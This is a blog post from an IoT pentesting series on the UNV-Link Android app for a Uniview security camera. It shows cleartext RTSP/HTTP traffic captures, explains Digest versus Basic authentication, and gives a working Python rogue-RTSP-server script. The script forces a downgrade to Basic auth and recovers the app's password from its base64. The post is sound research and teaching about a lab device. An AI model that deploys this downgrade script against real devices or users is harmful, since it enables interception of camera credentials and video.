---
source: matt-brown
source_url: https://brownfinesecurity.com/blog/attacking-enterprise-iot-mobile-apps
title: "Enterprise IoT Pentesting: Client Mobile Application Testing - Brown Fine Security"
---

# Enterprise IoT Pentesting: Client Mobile Application Testing

In the [last segment](/blog/uniview-camera-network-services) of our Enterprise IoT Pentesting series, we analyzed the security of the network services on our Uniview SC-3243 commercial security camera.

In this final post on our Uniview IoT device, we will look at the security of the [UNV-Link User](https://play.google.com/store/apps/details?id=com.soft.user.link&hl=en-US&pli=1) Android mobile application.

## Network Traffic Analysis

In the same way we looked at the [traffic between our device and the cloud](/blog/cleartext-communications-to-univew-cloud-servers), we will now look at the traffic between the client mobile application and our IoT device.

To do this we will use the same [mitmrouter](https://github.com/nmatt0/mitmrouter) setup as before to capture traffic on a bridge interface in Wireshark.

Since we want to focus on traffic between the mobile application and IoT device, we can set the following Wireshark display filter (192.168.100.26 my IoT device and 192.168.100.30 is my Android phone):

```
ip.addr == 192.168.100.30 && ip.addr == 192.168.100.26
```


After this, we can open up the mobile application and navigate to `Me -> Local Device`

and observe the SC-3243-IWPS-F28 device that has already been configured. When selecting our device, a Live View is opened with a live video feed from the camera.

In Wireshark, we see communications to the webserver running on port 80 and communications to the RTSP server running on port 554.

So we can see cleartext (not encrypted) HTTP and RTSP data! Looking into one HTTP and one RTSP packet, we can see that digest authentication is being used.

HTTP Request with digest auth:

```
GET /LAPI/V1.0/System/IntegrationInfo HTTP/1.1
Authorization: Digest username="admin", realm="e4f14c776608", qop="auth", algorithm="MD5", uri="/LAPI/V1.0/System/IntegrationInfo", nonce="bb43b7e45bf106ee0d0206b96c425b68", nc=00000002, cnonce="AHH0T60101W271T17QV55E679C0V26RT", response="b0b31868182efdd78dc63ca565a8119a"
User-Agent: Dalvik/2.1.0 (Linux; U; Android 16; Pixel 7 Build/BP2A.250605.031.A2)
Host: 192.168.100.26
Connection: Keep-Alive
Accept-Encoding: gzip
```


RTSP Request with digest auth:

```
FASTPLAY rtsp://192.168.100.26:554/media/video1/videoaudio RTSP/1.0
CSeq: 2
Authorization: Digest username="admin", realm="e4f14c776608", nonce="53f2ceab94fab56dcd62b30ed0b508b3", uri="rtsp://192.168.100.26:554/media/video1/videoaudio", response="a430a23800c58ea6c2041c13a3572dd5"
Transport: RTP/AVP/TCP;unicast;interleaved_video=0-1;interleaved_audio=2-3
Scale: 1.000000
Speed: 1.000000
Range: npt=0.000-
Accept: application/sdp
User-Agent: IMCP
keymgmt: prot=GET-M-KEY; data="00010001;D917BC27A9C0D07C9BA076473A619B73E94E47AE63349CC70A8223D1DFF2ED51C811AC13F7E85D0096F251486C9085391195CF9CF2BD9399B0D88F80ADE139D73E8E7B54888D566E7C09D692B32FA082A7CCC5E58A2E998F284135586E584AD0AC35D40FEFDF3114673DA4B9A1DD67CB74E842A833E64A35D70370C12C1F4509"
```


## Digest Authentication vs Basic Authentication

I'm going to date myself a bit here... In 2010 I headed off for college as a freshman. At that time, the university didn't have any options for encrypted (WEP or WPA/WPA2) WiFi. Moreover, many sites like Facebook and Twitter only used HTTPS (HTTP with TLS) on the login page. Everything else (includes session tokens) were passed in cleartext. It was my wild west. The golden age of hacking.

The lack of end-to-end encryption that TLS provides prompted the development of different HTTP authentication mechanisms that had various pros/cons. Basic authentication is, as the name implies, the simplest. Basic authentication concatenates the username, a colon, and the password and base64 encodes it.

```
base64('admin' + ":' + 'password') = YWRtaW46cGFzc3dvcmQK
```


This is then passed in the HTTP "Authorization" header as follows:

```
Authorization: Basic YWRtaW46cGFzc3dvcmQK
```


This method of authentication is great for when you have a solid TLS session to send that data through. But if this HTTP request header is sent using cleartext HTTP then it can be easily intercepted and decoded by an attacker.

This is where digest authentication enters the picture. Instead of sending the password in cleartext, Digest authentication uses the password as a secret in a challenge-response mechanism. We won't get into all of the details of digest auth here, but the key thing to understand is that if an attacker can perform a man-in-the-middle attack and the client and server use digest authentication, the attacker cannot obtain the password.

Lets walk through the digest authentication flow of our RTSP stream:

Packet 1 - Mobile App sends request to IoT Camera:

```
FASTPLAY rtsp://192.168.100.26:554/media/video1/videoaudio RTSP/1.0
CSeq: 1
Transport: RTP/AVP/TCP;unicast;interleaved_video=0-1;interleaved_audio=2-3
Scale: 1.000000
Speed: 1.000000
Range: npt=0.000-
Accept: application/sdp
User-Agent: IMCP
keymgmt: prot=GET-M-KEY; data="00010001;D917BC27A9C0D07C9BA076473A619B73E94E47AE63349CC70A8223D1DFF2ED51C811AC13F7E85D0096F251486C9085391195CF9CF2BD9399B0D88F80ADE139D73E8E7B54888D566E7C09D692B32FA082A7CCC5E58A2E998F284135586E584AD0AC35D40FEFDF3114673DA4B9A1DD67CB74E842A833E64A35D70370C12C1F4509"
```


Packet 2 - IoT Camera responds with 401 Unauthorized containing digest auth challenge:

```
RTSP/1.0 401 Unauthorized
CSeq: 1
WWW-Authenticate: Digest realm="e4f14c776608",nonce="53f2ceab94fab56dcd62b30ed0b508b3", stale="FALSE"
```


Packet 3 - Mobile App resends original request but this time with the computed digest auth header:

```
FASTPLAY rtsp://192.168.100.26:554/media/video1/videoaudio RTSP/1.0
CSeq: 2
Authorization: Digest username="admin", realm="e4f14c776608", nonce="53f2ceab94fab56dcd62b30ed0b508b3", uri="rtsp://192.168.100.26:554/media/video1/videoaudio", response="a430a23800c58ea6c2041c13a3572dd5"
Transport: RTP/AVP/TCP;unicast;interleaved_video=0-1;interleaved_audio=2-3
Scale: 1.000000
Speed: 1.000000
Range: npt=0.000-
Accept: application/sdp
User-Agent: IMCP
keymgmt: prot=GET-M-KEY; data="00010001;D917BC27A9C0D07C9BA076473A619B73E94E47AE63349CC70A8223D1DFF2ED51C811AC13F7E85D0096F251486C9085391195CF9CF2BD9399B0D88F80ADE139D73E8E7B54888D566E7C09D692B32FA082A7CCC5E58A2E998F284135586E584AD0AC35D40FEFDF3114673DA4B9A1DD67CB74E842A833E64A35D70370C12C1F4509"
```


Note that the attacker can still see lots of sensitive data. In our packet capture above the attacker can see unencrypted RTSP video frame data and results of HTTP API calls. However, the password is safe.

If encryption is not used to send the authentication for HTTP (or RTSP) then digest authentication is the clearly better choice. There are downsides to digest authentication (requiring passwords stored in cleartext and/or insecure hash state on the server device) but we will set those aside for now.

## Digest to Basic Authentication Downgrade Attack

So clearly an attacker would prefer basic authentication to be used if the HTTP/RTSP communications are not encrypted. What if we could trick the client authenticating to use basic authentication instead?

We will use the following python script to pretend to be the RTSP server running on our IoT camera and request the use of Basic authentication instead of Digest:

```
#!/usr/bin/env python3
import socket
import re
host = "0.0.0.0"
port = 5555
server_socket = socket.socket()
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server_socket.bind((host, port))
server_socket.listen(2)
conn, address = server_socket.accept()
print("Connection from: " + str(address))
data = conn.recv(10000).decode()
if data:
print("from connected user: " + str(data))
match = re.search("CSeq: \\d+", data)
cseq = match.group(0)
resp = 'RTSP/1.0 401 Unauthorized\r\n'+cseq+'\r\nWWW-Authenticate: Basic realm="e4f14c776608"\r\n\r\n'
conn.send(resp.encode())
data = conn.recv(10000).decode()
print("data: " + str(data))
conn.close()
```


When running the python script and attempting to live stream from the mobile application, we get the following script output:

```
Connection from: ('192.168.100.30', 41336)
from connected user: FASTPLAY rtsp://192.168.100.26:554/media/video1/videoaudio RTSP/1.0
CSeq: 9
Transport: RTP/AVP/TCP;unicast;interleaved_video=0-1;interleaved_audio=2-3
Scale: 1.000000
Speed: 1.000000
Range: npt=0.000-
Accept: application/sdp
User-Agent: IMCP
keymgmt: prot=GET-M-KEY; data="00010001;D917BC27A9C0D07C9BA076473A619B73E94E47AE63349CC70A8223D1DFF2ED51C811AC13F7E85D0096F251486C9085391195CF9CF2BD9399B0D88F80ADE139D73E8E7B54888D566E7C09D692B32FA082A7CCC5E58A2E998F284135586E584AD0AC35D40FEFDF3114673DA4B9A1DD67CB74E842A833E64A35D70370C12C1F4509"
data: FASTPLAY rtsp://192.168.100.26:554/media/video1/videoaudio RTSP/1.0
CSeq: 10
Authorization: Basic YWRtaW46cGFzc3dvcmQxIQ==
Transport: RTP/AVP/TCP;unicast;interleaved_video=0-1;interleaved_audio=2-3
Scale: 1.000000
Speed: 1.000000
Range: npt=0.000-
Accept: application/sdp
User-Agent: IMCP
keymgmt: prot=GET-M-KEY; data="00010001;D917BC27A9C0D07C9BA076473A619B73E94E47AE63349CC70A8223D1DFF2ED51C811AC13F7E85D0096F251486C9085391195CF9CF2BD9399B0D88F80ADE139D73E8E7B54888D566E7C09D692B32FA082A7CCC5E58A2E998F284135586E584AD0AC35D40FEFDF3114673DA4B9A1DD67CB74E842A833E64A35D70370C12C1F4509"
```


Notice the mobile application automatically downgraded to using Basic authentication!

```
Authorization: Basic YWRtaW46cGFzc3dvcmQxIQ==
```


We can simply base64 decode this string to get our username and password:

```
$ echo YWRtaW46cGFzc3dvcmQxIQ== | base64 -d
admin:password1!
```


You would be amazed how many HTTP/RTSP client implementations are susceptible to this downgrade attack.

### Need IoT Security Expertise?

Brown Fine Security provides expert IoT penetration testing to help secure your connected devices. From hardware analysis to cloud API testing, we uncover vulnerabilities before attackers do.

[Get a Free Consultation](/contact)

### Want to Learn IoT Hacking?

Ready to break into IoT security? Our hands-on training courses teach real-world hardware hacking, firmware analysis, and IoT exploitation techniques used by professional pentesters.

[Explore Training Courses](https://training.brownfinesecurity.com/)